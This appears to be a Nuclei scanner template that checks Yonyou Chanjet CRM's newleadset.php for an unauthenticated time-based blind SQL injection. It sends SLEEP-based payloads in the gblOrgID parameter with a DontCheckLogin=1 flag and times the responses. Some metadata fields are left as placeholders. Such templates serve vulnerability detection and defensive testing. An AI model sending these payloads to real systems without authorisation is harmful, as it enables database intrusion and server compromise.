id: tplus-crm-newleadset-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 用友畅捷CRM newleadset.php 处存在SQL注入漏洞 ，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(3)))HAjH)--+-&DontCheckLogin=1"
      - "{{BaseURL}}/lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(6)))HAjH)--+-&DontCheckLogin=1"
      - "{{BaseURL}}/lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(9)))HAjH)--+-&DontCheckLogin=1"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"